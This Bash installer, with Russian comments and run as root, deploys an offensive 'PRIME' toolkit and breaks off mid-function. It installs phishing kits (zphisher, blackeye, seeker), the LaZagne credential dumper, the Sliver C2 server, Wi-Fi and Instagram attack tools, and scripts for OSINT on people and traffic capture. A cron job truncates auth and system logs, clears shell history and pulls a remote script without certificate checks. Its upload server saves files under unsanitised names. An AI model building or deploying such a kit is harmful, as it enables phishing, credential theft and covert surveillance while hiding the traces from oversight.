#!/bin/bash

# --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
CURRENT_VERSION="30.8"
UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'

# --- ПРОВЕРКА ПРАВ ---
if [ "$EUID" -ne 0 ]; then 
  echo -e "${R}[!] Ошибка: Запустите от имени root${NC}"
  exit
fi

#create_repair_tool() {

create_repair_script(){
    echo -e "\e[34m[*] Создание инструмента восстановления (repair.sh)...\e[0m"
    
    cat << 'EOF' > /root/repair.sh
#!/bin/bash
echo -e "\e[1;33m[!][ Режим восстановления Core-Prime ][!]\e[0m"

# Удаляем старые сломанные версии
rm -f /root/install_all.sh
rm -f /usr/local/bin/launcher

# Чистим систему
dpkg --configure -a 2>/dev/null
apt --fix-broken install -y 2>/dev/null

# Качаем свежую версию
echo "[*] Загрузка актуальной версии..."
curl -L -o /root/install_all.sh https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh
chmod +x /root/install_all.sh

echo -e "\e[1;32m[+] Восстановление завершено. Запусти: ./install_all.sh\e[0m"
EOF

    chmod +x /root/repair.sh
}



repair_and_clean() {
    [ -f /var/lib/dpkg/status ] && sed -i '/Package: php8/,/^$/d' /var/lib/dpkg/status 2>/dev/null
    sync && echo 3 | tee /proc/sys/vm/drop_caches >/dev/null 2>&1
    rm -f /root/*.zip /root/*.tmp /root/*.log /root/*.deb 2>/dev/null
    apt-get clean && rm -rf ~/.cache/pip
}

safe_pip() {
    python3 -m pip install --no-cache-dir --break-system-packages "$@" >/dev/null 2>&1
    repair_and_clean
}


setup_cron() {
    echo -e "${B}[*] Инициализация системы автоматизации...${NC}"

    # 1. Создаем скрипт-обработчик
    # Мы используем truncate для логов, чтобы не нарушать работу демонов
    cat << 'EOD' > /root/cron_task.sh
#!/bin/bash
# --- Энергосбережение и сеть ---
# Не даем Wi-Fi уснуть, пока идет обслуживание
svc power stayon true 2>/dev/null

# --- Очистка ресурсов ---
sync && echo 3 > /proc/sys/vm/drop_caches
rm -rf /tmp/* /root/.cache/*
truncate -s 0 /var/log/syslog /var/log/auth.log /var/log/kern.log 2>/dev/null

# --- Обновление баз инструментов ---
# Обновляем шаблоны Nuclei (раз в 20 мин — это часто, но для мобильного OSINT полезно)
nuclei -update-templates -silent

# --- Ремонт и поддержка пакетов ---
DEBIAN_FRONTEND=noninteractive apt-get install -f -y && dpkg --configure -a >/dev/null 2>&1

# --- Обновление ядра инсталлера ---
curl -L -k -s "https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh" -o /root/install_all.sh && chmod +x /root/install_all.sh

# --- Безопасность ---
history -c && history -w
EOD


    # Делаем скрипт исполняемым
    chmod +x /root/cron_task.sh

    # 2. Инъекция в Crontab
    # Удаляем старую задачу (если была) и записываем новую на каждые 20 минут
    (crontab -l 2>/dev/null | grep -v "/root/cron_task.sh"; echo "*/20 * * * * /root/cron_task.sh >/dev/null 2>&1") | crontab -

    # 3. Проверка запуска демона cron
    if ! pgrep cron >/dev/null; then
        echo -e "${Y}[!] Внимание: Служба cron не запущена. Запускаю...${NC}"
        service cron start
    fi

    echo -e "${G}[+] Cron-обработчик настроен на цикл 20 минут.${NC}"
}


install_clamav_force() {
    # Проверяем, установлен ли clamav (ищем исполняемый файл clamscan)
    if ! command -v clamscan >/dev/null 2>&1; then
        echo -e "${Y}[*] ClamAV не найден. Инъекция ClamAV (Force Install)...${NC}"
        repair_and_clean
        apt-get update >/dev/null 2>&1
        cd /root
        # Скачиваем пакеты
        apt-get download clamav clamav-base clamav-freshclam libclamav* >/dev/null 2>&1
        # Форсированная установка всех скачанных .deb
        dpkg -i --force-all *.deb >/dev/null 2>&1
        # Создание необходимых директорий и файлов заглушек
        mkdir -p /var/lib/clamav
        touch /var/lib/clamav/main.cvd /var/lib/clamav/daily.cvd
        # Очистка за собой
        rm -f *.deb
    else
        echo -e "${G}[+] ClamAV уже установлен. Пропускаю...${NC}"
    fi
}

install_tool() {
    local name=$1; local url=$2; local exec_file=$3; local extra_cmd=$4
    
    # 1. Проверка на существование
    if [ -d "$name" ] && [ -f "$name/$exec_file" ]; then 
        echo -e "${G}[+] $name найден. Пропуск...${NC}"
        return 0 
    fi

    echo -e "${Y}[*] Установка $name...${NC}"
    
    # 2. Подготовка
    rm -rf "temp.zip" "$name" # Удаляем старые битые попытки
    
    # 3. Скачивание с проверкой кода ответа (200 OK)
    curl -L -k -f "$url" -o "temp.zip" >/dev/null 2>&1
    
    # Проверка: скачался ли файл и является ли он ZIP-архивом
    if [ -s "temp.zip" ] && file "temp.zip" | grep -q "Zip archive"; then
        unzip -q "temp.zip" -d "temp_extract"
        
        # Ищем любую папку внутри temp_extract
        local extracted_dir=$(ls -d temp_extract/*/ 2>/dev/null | head -n 1)
        
        if [ -n "$extracted_dir" ]; then
            mv "$extracted_dir" "$name"
            rm -rf "temp_extract" "temp.zip"
            
            # 4. Выполнение доп. команд (сборка/pip)
            if [ -n "$extra_cmd" ]; then
                echo -e "${B}[*] Настройка зависимостей для $name...${NC}"
                (cd "$name" && eval "$extra_cmd" >/dev/null 2>&1)
            fi
            
            # 5. Права доступа
            if [ -f "$name/$exec_file" ]; then
                chmod +x "$name/$exec_file"
                echo -e "${G}[+] $name готов к работе.${NC}"
            else
                # Если файл не найден там, где ждали, ищем его по всей папке
                find "$name" -name "$exec_file" -exec chmod +x {} \;
                echo -e "${G}[+] $name установлен (path fixed).${NC}"
            fi
        fi
    else
        echo -e "${R}[!] Ошибка: Сервер GitHub отклонил запрос или файл поврежден.${NC}"
        rm -f "temp.zip"
    fi
    
    # Твоя функция очистки RAM и кэша
    repair_and_clean
}



# --- СТАРТ ---
clear
echo -e "${R}[*] PRIME v$CURRENT_VERSION: ТОТАЛЬНАЯ СБОРКА...${NC}"
mkdir -p /root/share /root/PRIME_INBOX
repair_and_clean

apt-get update >/dev/null 2>&1
apt-get install -y php curl unzip python3-pip python3-flask nmap foremost tshark aircrack-ng chkrootkit whatweb htop bluez tor git >/dev/null 2>&1

install_clamav_force

# Твой расширенный список инструментов
TOOLS=(
    "zphisher;https://github.com/htr-tech/zphisher/archive/refs/heads/master.zip;zphisher.sh;"
    "seeker;https://github.com/thewhiteh4t/seeker/archive/refs/heads/master.zip;seeker.py;safe_pip -r requirements.txt"
    # "wifite2;https://github.com/derv82/wifite2/archive/refs/heads/master.zip;wifite.py;python3 setup.py install --break-system-packages"
    "sqlmap;https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip;sqlmap.py;"
   # "routersploit;https://github.com/threat9/routersploit/archive/refs/heads/master.zip;rsf.py;safe_pip -r requirements.txt"
   # "sherlock;https://github.com/sherlock-project/sherlock/archive/refs/heads/master.zip;sherlock_project/sherlock.py;safe_pip -r requirements.txt"
     #"phoneinfoga;https://github.com/sundowndev/phoneinfoga/archive/refs/heads/master.zip;phoneinfoga.py;safe_pip -r requirements.txt"
    #"infoga;https://github.com/m4ll0k/Infoga/archive/refs/heads/master.zip;infoga.py;safe_pip -r requirements.txt"
    #"phonesploit;https://github.com/Zucccs/PhoneSploit-Python/archive/refs/heads/main.zip;phonesploitpython.py;safe_pip -r requirements.txt"
    "cupp;https://github.com/Mebus/cupp/archive/refs/heads/master.zip;cupp.py;"
    #"anonym8;https://github.com/HiroshiSama/anonym8/archive/refs/heads/master.zip;anonym8;chmod +x install.sh && ./install.sh"
)

# Дополнительные инструменты для EXPLOIT HUB
TOOLS+=(
   # "metasploit;https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh;msfconsole;chmod +x metasploit.sh && ./metasploit.sh"
    "lazagne;https://github.com/AlessandroZ/LaZagne/archive/refs/heads/master.zip;laZagne.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "sliver;https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux;sliver-server;chmod +x sliver-server"
    "exploitdb;https://github.com/offensive-security/exploitdb/archive/refs/heads/master.zip;searchsploit;ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit"
)


for entry in "${TOOLS[@]}"; do
    IFS=";" read -r t_name t_url t_exec t_extra <<< "$entry"
    install_tool "$t_name" "$t_url" "$t_exec" "$t_extra"
done

# Специальные установки из твоего оригинала
if [ ! -d "/root/phoneinfoga" ]; then
    mkdir /root/phoneinfoga && cd /root/phoneinfoga
    curl -Lk https://github.com/sundowndev/phoneinfoga/releases/download/v2.10.8/phoneinfoga_Linux_armv7.tar.gz | tar xz
    chmod +x phoneinfoga
fi

if [ ! -d "/root/infoga" ]; then
    git clone --depth=1 https://github.com/alpkeskin/mosint.git /root/infoga
    cd /root/infoga && safe_pip -r requirements.txt
fi

# --- 1. УНИВЕРСАЛЬНАЯ И БЕЗОПАСНАЯ ФУНКЦИЯ ЗАПИСИ ---
# Использует printf %s для предотвращения интерпретации символов внутри кода
smart_cat() {
    local target_file="$1"
    local content="$2"
    local perms="${3:-755}"

    mkdir -p "$(dirname "$target_file")"
    
    # Запись байт-в-байт без риска инъекций
    printf "%s\n" "$content" > "$target_file"
    
    chmod "$perms" "$target_file"
    echo -e "${G}[OK]${NC} Файл создан: $target_file (Права: $perms)"
}

# --- 2. УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ОБНОВЛЕНИЯ МОДУЛЕЙ ---
# Проверяет версию внутри файла перед перезаписью
update_module() {
    local file_path="$1"
    local version="$2"
    local content_func="$3"
    local module_name="$4"

    if [ ! -f "$file_path" ] || ! grep -q "VERSION = '$version'" "$file_path"; then
        echo -e "${Y}[!] Обновление модуля $module_name до v$version...${NC}"
        
        # Вызов функции генерации контента
        $content_func "$file_path" "$version"
        
        echo -e "${G}[+] Модуль $module_name v$version успешно интегрирован.${NC}"
    else
        echo -e "${G}[+] Модуль $module_name v$version уже актуален.${NC}"
    fi
}


# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
    code=$(cat << 'EOF'
import sys, re, json
from urllib.request import urlopen

# VERSION = '{{V_NUM}}'

def get_detailed_data(iban):
    try:
        url = f"[https://api.ibanlist.com/v1/validate/](https://api.ibanlist.com/v1/validate/){iban}"
        with urlopen(url, timeout=5) as response:
            return json.loads(response.read().decode())
    except: return None

def validate_structure(iban):
    """Разбор структуры (специфика FR и общая)"""
    res = {
        "Country": iban[:2],
        "Check": iban[2:4],
        "BBAN": iban[4:],
    }
    if iban.startswith('FR'):
        res.update({
            "Bank Code": iban[4:9],
            "Branch Code": iban[9:14],
            "Account": iban[14:25],
            "RIB Key": iban[25:27]
        })
    return res

if __name__ == "__main__":
    if len(sys.argv) < 2: sys.exit(1)
    
    # Очистка от пробелов и тире
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    
    # Параметры для сверки
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else None
    provided_bic = sys.argv[3].upper() if len(sys.argv) > 3 else None

    print(f"\033[1;34m--- РЕЗУЛЬТАТ ПРОВЕРКИ IBAN ---\033[0m")
    
    struct = validate_structure(target)
    for key, val in struct.items():
        print(f"\033[96m{key}:\033[0m {val}")

    data = get_detailed_data(target)
    if data and data.get('valid'):
        bank_name = data.get('bank_name', 'N/A')
        bic = data.get('bic', 'N/A')
        
        print(f"\n\033[1;32m[+] СТАТУС: ВАЛИДЕН\033[0m")
        print(f"🏦 Банк: {bank_name}")
        print(f"🔑 BIC: {bic}")
        
        if provided_name or provided_bic:
            print(f"\n\033[1;35m--- ОТЧЕТ О СВЕРКЕ (MATCH REPORT) ---\033[0m")
            if provided_bic:
                if provided_bic in bic:
                    print(f"✅ BIC Match: ПРОВЕРЕНО ({bic})")
                else:
                    print(f"❌ BIC Mismatch! Ожидалось: {provided_bic}, Найдено: {bic}")
            
            if bank_name != 'N/A':
                print(f"ℹ️ Подтверждение: Банк {bank_name} верифицирован")
    else:
        print(f"\033[91m[-] ОШИБКА: Неверная структура или контрольная сумма\033[0m")
EOF
)

    # Внедряем версию
    code="${code//\{\{V_NUM\}\}/$v_num}"

    # Используем smart_cat для записи (права 755 по умолчанию)
    smart_cat "$target_file" "$code"
}

# --- ВЫЗОВ В СЕКЦИИ DEPLOYMENT ---


# Функция-генератор для AV-Server (v1.2)
# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
generate_av_server_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    code=$(cat << 'EOF'
from flask import Flask, request, render_template_string
import subprocess, os, shutil, socket, time

# VERSION = '{{V_NUM}}'
app = Flask(__name__)
CLAM_PATH = shutil.which('clamscan') or '/usr/bin/clamscan'

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

STYLE = """
<style>
    body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
    .container { border: 1px solid #00ff41; padding: 30px; background: #111; box-shadow: 0 0 20px rgba(0,255,65,0.2); border-radius: 5px; width: 80%; max-width: 800px; }
    h2 { border-bottom: 1px solid #00ff41; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
    .status-box { padding: 15px; margin-bottom: 15px; font-weight: bold; text-align: center; border: 1px solid; text-transform: uppercase; }
    pre { white-space: pre-wrap; font-size: 0.85em; color: #0cf; background: #000; padding: 15px; border: 1px solid #222; max-height: 400px; overflow-y: auto; }
    .clean { color: #00ff41; border-color: #00ff41; background: rgba(0,255,65,0.1); }
    .infected { color: #ff3e3e; border-color: #ff3e3e; background: rgba(255,62,62,0.1); }
</style>
"""

@app.route('/')
def index():
    return render_template_string(STYLE + '<div class="container"><h2>> SECURE_GATEWAY</h2><form method="post" action="/scan" enctype="multipart/form-data"><input type="file" name="file" required><br><br><button type="submit" style="background:#00ff41; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">INITIATE SSL SCAN</button></form></div>')

@app.route('/scan', methods=['POST'])
def scan():
    f = request.files.get('file')
    if not f: return "No data", 400
    
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    os.sync()

    scan_output = ""
    try:
        cmd = [CLAM_PATH, '--no-summary', tmp_path]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        scan_output = res.stdout if res.stdout else res.stderr
        if not scan_output and res.returncode == 0:
            scan_output = f"{f.filename}: OK"
    except Exception as e:
        scan_output = f"System Error: {str(e)}"
    finally:
        if os.path.exists(tmp_path): os.remove(tmp_path)

    is_infected = "FOUND" in scan_output
    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_TRANSMISSION_VERIFIED"
    status_class = "infected" if is_infected else "clean"

    return render_template_string(STYLE + f"""
    <div class="container">
        <h2>> SCAN_RESULTS</h2>
        <div class="status-box {status_class}">{status_msg}</div>
        <pre>{{{{ output }}}}</pre>
        <a href="/" style="color:#555; text-decoration:none; display:block; text-align:center; margin-top:20px;">[ RETURN ]</a>
    </div>
    """, output=scan_output)

if __name__ == '__main__':
    # Авто-генерация SSL
    if not os.path.exists('/root/cert.pem'):
        os.system('openssl req -x509 -newkey rsa:2048 -nodes -out /root/cert.pem -keyout /root/key.pem -days 365 -subj "/CN=scanclamavlocal"')
    
    os.system('fuser -k 5000/tcp 2>/dev/null')
    app.run(host='0.0.0.0', port=5000, ssl_context=('/root/cert.pem', '/root/key.pem'))
EOF
)
    # Внедряем версию и записываем
    code="${code//\{\{V_NUM\}\}/$v_num}"
    smart_cat "$target_file" "$code"
}


# Функция-генератор для Share-Server (v1.0)
# --- ГЕНЕРАТОР МОДУЛЯ SHARE-SERVER (SHARE SECTOR) ---
generate_share_server_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    code=$(cat << 'EOF'
from flask import Flask, render_template_string, send_from_directory
import os

# VERSION = '{{V_NUM}}'

app = Flask(__name__)
SHARE_DIR = '/root/share'

if not os.path.exists(SHARE_DIR):
    os.makedirs(SHARE_DIR)

STYLE = """
<style>
    body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 40px; }
    h2 { text-transform: uppercase; letter-spacing: 3px; border-bottom: 2px solid #00ff41; display: inline-block; padding-bottom: 10px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; margin-top: 30px; }
    .file-card { 
        background: #111; border: 1px solid #333; padding: 20px; text-align: center; 
        transition: 0.3s; text-decoration: none; color: #00ff41; border-radius: 4px;
        display: flex; flex-direction: column; align-items: center;
    }
    .file-card:hover { border-color: #00ff41; background: #00ff4111; transform: translateY(-5px); }
    .icon { font-size: 40px; margin-bottom: 10px; }
</style>
"""

HTML = STYLE + """
<div style="max-width: 1000px; margin: auto;">
    <h2>> SECURE_FILE_DISTRIBUTION</h2>
    <p style="color: #555; font-size: 0.8em;">Sector Location: {{ path }}</p>
    <div class="grid">
        {% for f in files %}
        <a href="/get/{{f}}" class="file-card">
            <div class="icon">📄</div>
            <div style="font-size: 0.9em; word-break: break-all;">{{ f }}</div>
        </a>
        {% else %}
        <p style="color: #555; font-style: italic;">No files detected in the transmission sector.</p>
        {% endfor %}
    </div>
</div>
"""

@app.route('/')
def index():
    try:
        files = os.listdir(SHARE_DIR)
    except:
        files = []
    return render_template_string(HTML, files=files, path=SHARE_DIR)

@app.route('/get/<filename>')
def get_file(filename):
    return send_from_directory(SHARE_DIR, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002)
EOF
)
    # Внедряем версию и записываем
    code="${code//\{\{V_NUM\}\}/$v_num}"
    smart_cat "$target_file" "$code"
}

# Функция-генератор для Upload-Server (v1.0)
generate_upload_server_code() {
    local target_file="$1"
    local v_num="$2"
    local code
    
    # Захватываем код Python. Кавычки вокруг 'EOF' критически важны!
    code=$(cat << 'EOF'
from flask import Flask, request, render_template_string
import os

# VERSION = '{{V_NUM}}'

app = Flask(__name__)

# Автоматическое определение директории (SD-карта или root)
UPLOAD_DIR = '/sdcard/PRIME_INBOX' if os.path.exists('/sdcard') else '/root/PRIME_INBOX'
if not os.path.exists(UPLOAD_DIR): 
    os.makedirs(UPLOAD_DIR, exist_ok=True)

STYLE = """
<style>
    body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .box { border: 2px dashed #00ff41; padding: 40px; background: #111; box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); border-radius: 10px; text-align: center; max-width: 500px; }
    h2 { letter-spacing: 5px; text-shadow: 0 0 10px #00ff41; margin-bottom: 30px; }
    input[type="file"] { background: #1a1a1a; border: 1px solid #333; padding: 10px; color: #00ff41; width: 100%; margin-bottom: 20px; }
    button { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; width: 100%; }
    button:hover { background: #008f25; box-shadow: 0 0 15px #00ff41; }
</style>
"""

HTML_INDEX = STYLE + """
<div class="box">
    <h2>> INBOUND_DROP_BOX</h2>
    <p style="font-size: 0.8em; margin-bottom: 20px; color: #888;">Secure uplink established.</p>
    <form method="post" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Initiate Upload</button>
    </form>
    <div style="color: #555; font-size: 0.7em; margin-top: 20px;">Target: {{ target_dir }}</div>
</div>
"""

@app.route('/')
def index():
    return render_template_string(HTML_INDEX, target_dir=UPLOAD_DIR)

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "Error", 400
    f = request.files['file']
    if f.filename == '': return "Error", 400
    f.save(os.path.join(UPLOAD_DIR, f.filename))
    return "SUCCESS: File received"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
EOF
)
    # Внедряем версию через замену плейсхолдера
    code="${code//\{\{V_NUM\}\}/$v_num}"
    
    # Записываем через smart_cat
    smart_cat "$target_file" "$code"
}

# --- 4. ИСПОЛНЕНИЕ (DEPLOYMENT) ---

echo -e "${B}--- STARTING CORE-PRIME SYNCHRONIZATION ---${NC}"

# --- ГЕНЕРАЦИЯ LAUNCHER (Твой оригинал + расширенный TOOLS_DATA) ---
# --- ГЕНЕРАТОР ГЛАВНОГО ЛОНЧЕРА (СОХРАНЕННЫЙ ОРИГИНАЛ) ---
generate_launcher_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    # Мы помещаем весь твой код в переменную, заменяя только версию
    code=$(cat << 'EOF'
#!/bin/bash
CURRENT_VERSION="{{V_NUM}}"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# Решение проблемы с кэшем ZSH
if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
    rm -f /root/.cache/zcompdump* 2>/dev/null
    rm -f /root/.zcompdump* 2>/dev/null
fi

# 1. Определяем текущий локальный IP
CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

# 2. Настраиваем dnsmasq
if command -v dnsmasq >/dev/null 2>&1; then
    echo -e "${G}[*] Configuring DNS: scanclamavlocal -> $CURRENT_IP${NC}"
    
    cat << EOD > /etc/dnsmasq.conf
domain-needed
bogus-priv
interface=lo
interface=wlan0
address=/scanclamavlocal/$CURRENT_IP
EOD

    if [ -f /etc/init.d/dnsmasq ]; then
        service dnsmasq restart 2>/dev/null
    else
        killall dnsmasq 2>/dev/null
        dnsmasq -C /etc/dnsmasq.conf 2>/dev/null
    fi
fi

repair() { 
    sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
    rm -rf /root/.cache/* /tmp/* 2>/dev/null
    history -c
}

get_stats() {
    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
    local rom=$(df -h / | awk 'NR==2 {print $4}')
    local sd_path=$(ls -d /storage/* 2>/dev/null | grep -vE "self|emulated" | head -n 1)
    local sd_info="N/A"
    [ -n "$sd_path" ] && sd_info=$(df -h "$sd_path" | awk 'NR==2 {print $4}')
    local net="${R}OFFLINE${NC}"
    ping -c 1 -W 1 8.8.8.8 >/dev/null 2>&1 && net="${G}ONLINE${NC}"
    local srv=""
    pgrep -f "av_server.py" >/dev/null && srv+=" ${G}[AV]${NC}"
    pgrep -f "share_server.py" >/dev/null && srv+=" ${G}[SH]${NC}"
    pgrep -f "upload_server.py" >/dev/null && srv+=" ${G}[UP]${NC}"
    [ -z "$srv" ] && srv="${R}NONE${NC}"
    echo -e "${Y}RAM: ${G}$ram ${Y}| ROM: ${G}$rom ${Y}| SD: ${G}$sd_info"
    echo -e "${Y}NET: $net ${Y}| ACTIVE SRV:$srv${NC}"
}

# --- БАЗА TOOLS_DATA ---
TOOLS_DATA=(
    "zphisher;https://github.com/htr-tech/zphisher/archive/refs/heads/master.zip;zphisher.sh;"
    "seeker;https://github.com/thewhiteh4t/seeker/archive/refs/heads/master.zip;seeker.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "blackeye;https://github.com/An0nUD4Y/blackeye/archive/refs/heads/master.zip;blackeye.sh;"
    "wifite2;https://github.com/derv82/wifite2/archive/refs/heads/master.zip;wifite.py;python3 setup.py install --break-system-packages"
    "routersploit;https://github.com/threat9/routersploit/archive/refs/heads/master.zip;rsf.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "kickthemout;https://github.com/k4m4/kickthemout/archive/refs/heads/master.zip;kickthemout.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "sqlmap;https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip;sqlmap.py;"
    "admin-finder;https://github.com/the-c0d3r/admin-panic/archive/refs/heads/master.zip;admin-panic.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "commix;https://github.com/commixproject/commix/archive/refs/heads/master.zip;commix.py;"
    "photon;https://github.com/s0md3v/Photon/archive/refs/heads/master.zip;photon.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "sherlock;https://github.com/sherlock-project/sherlock/archive/refs/heads/master.zip;sherlock_project/sherlock.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "infoga;https://github.com/m4ll0k/Infoga/archive/refs/heads/master.zip;infoga.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "phoneinfoga;https://github.com/sundowndev/phoneinfoga/archive/refs/heads/master.zip;phoneinfoga.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "recon-dog;https://github.com/s0md3v/ReconDog/archive/refs/heads/master.zip;dog;"
    # "phonesploit;https://github.com/Zucccs/PhoneSploit-Python/archive/refs/heads/main.zip;phonesploitpython.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "ghost-framework;https://github.com/EntySec/Ghost/archive/refs/heads/master.zip;ghost;python3 -m pip install -r requirements.txt --break-system-packages"
    "cupp;https://github.com/Mebus/cupp/archive/refs/heads/master.zip;cupp.py;"
    "instashell;https://github.com/thelinuxchoice/instashell/archive/refs/heads/master.zip;instashell.sh;chmod +x install.sh && ./install.sh"
)

# Дополнительные инструменты для EXPLOIT HUB
TOOLS_DATA+=(
   # "metasploit;https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh;msfconsole;chmod +x metasploit.sh && ./metasploit.sh"
    "lazagne;https://github.com/AlessandroZ/LaZagne/archive/refs/heads/master.zip;laZagne.py;python3 -m pip install -r requirements.txt --break-system-packages"
    "sliver;https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux;sliver-server;chmod +x sliver-server"
    "exploitdb;https://github.com/offensive-security/exploitdb/archive/refs/heads/master.zip;searchsploit;ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit"
)

zero_clear() {
    rm -rf /tmp/* /root/.npm/_logs/* > /dev/null 2>&1
    sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
}


run_osint() {
    clear; zero_clear
    echo -e "${Y}>>> [ SMART OSINT 2026: TOTAL ZERO MODE ] <<<${NC}"
    echo -ne "Input (Nick/Phone/Email/Domain): "
    read i
    [ -z "$i" ] && return

    # Эвристика: Распознаем тип ввода автоматически
    if [[ "$i" =~ ^\+?[0-9]{10,15}$ ]]; then
        echo -e "${B}[!] Type: PHONE. Running Fast-Int...${NC}"
        phoneinfoga scan -n "$i" | grep -E "Carrier|Location"
        socialscan "$i"
    elif [[ "$i" =~ "@" ]]; then
        echo -e "${B}[!] Type: EMAIL. Searching Breaches...${NC}"
        python3 /root/infoga/infoga.py --target "$i" 2>/dev/null
        socialscan "$i"
    elif [[ "$i" =~ "." ]] && [[ ! "$i" =~ " " ]]; then
        echo -e "${B}[!] Type: DOMAIN. Extracting Intel...${NC}"
        python3 /root/Photon/photon.py -u "$i" --level 1 --threads 10
    else
        echo -e "${B}[!] Type: NICKNAME. Rapid Multi-Scan...${NC}"
        # Запускаем Blackbird в фоне для скорости
        python3 /root/blackbird/blackbird.py -u "$i" --ai-check 2>/dev/null & 
        socialscan "$i"
        wait
    fi

    zero_clear; history -c
    echo -e "${G}>>> Smart Scan Finished. Trace Cleaned.${NC}"
}

# Функция: Мониторинг соединений в реальном времени
monitor_connections() {
    echo -e "\033[1;34m[*] Отслеживание активных соединений (CTRL+C для выхода)...\033[0m"
    # Показывает IP, процессы и порты, обновляя каждые 2 секунды
    watch -n 2 "ss -tpn | grep ESTAB"
}

# Функция: Быстрый поиск устройств в подсети
fast_network_scan() {
    echo -e "\033[1;34m[*] Сканирование локальной сети...\033[0m"
    # Используем стандартный интерфейс wlan0
    local subnet=$(ip route | grep wlan0 | awk '{print $1}')
    arp-scan --interface=wlan0 "$subnet"
}

# Функция: Скрытый перехват трафика
capture_traffic_smart() {
    echo -e "\033[1;34m[*] Запуск TShark (анализ в реальном времени)...\033[0m"
    echo -e "[*] Фильтр: только HTTP и DNS (чтобы не забивать память)"
    
    # Запуск перехвата только важных данных
    tshark -i wlan0 -f "port 80 or port 53" -T fields -e http.host -e dns.qry.name
}

# Функция: Очистка системы
clear_logs_and_traces() {
    echo -e "\033[1;33m[*] Стирание логов и истории...\033[0m"
    # Очистка истории bash
    history -c
    # Затирание временных файлов в /tmp
    rm -rf /tmp/*
    # Очистка кэша пакетов (освобождает место)
    apt-get clean
    echo -e "\033[1;32m[+] Система очищена.\033[0m"
}

run_osint2() {
    clear; zero_clear
    echo -e "${Y}>>> [ TOTAL OSINT 2: DEEP AUTO-PILOT ] <<<${NC}"
    read -p "Target: " i
    [ -z "$i" ] && return

    echo -e "${B}[*] Starting Full-Spectrum Analysis Pipeline...${NC}"

    # Запускаем цепочку инструментов последовательно-параллельно
    (
        echo -e "${G}[1/4] Social Presence Check...${NC}"
        socialscan "$i" > /tmp/osint_res.txt
        
        echo -e "${G}[2/4] Maigret Deep Parsing (PDF Report)...${NC}"
        maigret "$i" --parse --pdf --timeout 20
        
        echo -e "${G}[3/4] Snoop Database Search...${NC}"
        python3 /root/snoop/snoop.py "$i" --save-report
        
        echo -e "${G}[4/4] Blackbird Intelligence...${NC}"
        python3 /root/blackbird/blackbird.py -u "$i"
    )

    echo -e "${G}[+] All modules finished. Data saved in /root/reports/${NC}"
    zero_clear; history -c
    read -p "Press Enter to return..."
}

update_prime() {
    clear
    echo -e "${B}[ PRIME MASTER UPDATE CHECK ]${NC}"
    
    # URL для проверки версии (создай файл version.txt на GitHub с номером, например, 1.2)
    local VER_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/version.txt"
